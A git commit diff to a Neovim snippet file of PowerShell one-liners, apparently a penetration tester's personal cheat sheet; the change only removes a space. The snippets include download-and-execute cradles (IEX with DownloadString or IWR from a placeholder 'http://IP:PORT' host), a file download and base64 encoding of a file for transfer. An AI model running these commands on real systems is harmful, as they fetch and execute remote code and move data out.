ef52ef36ab286e8245d726f731f02928e9fbf2bf
rio <rio@kato.com>
2023-03-26 14:11:10 +0900

    update

--- .config/nvim/lua/pensnippet/powershell.lua
+++ .config/nvim/lua/pensnippet/powershell.lua
@@ -2,7 +2,7 @@ powershell_snippet = [[
 Get-Command COMMAND
 Get-ChildItem -Path PATH -Filte FILE -Recurse
 IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/FILE')
-IEX (IWR 'http://IP:PORT/FILE' -UseBasicParsing)
+IEX(IWR 'http://IP:PORT/FILE' -UseBasicParsing)
 (New-Object Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'FILE')
 [Convert]::ToBase64String([System.IO.File]::ReadAllBytes('PATH'))
 $pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
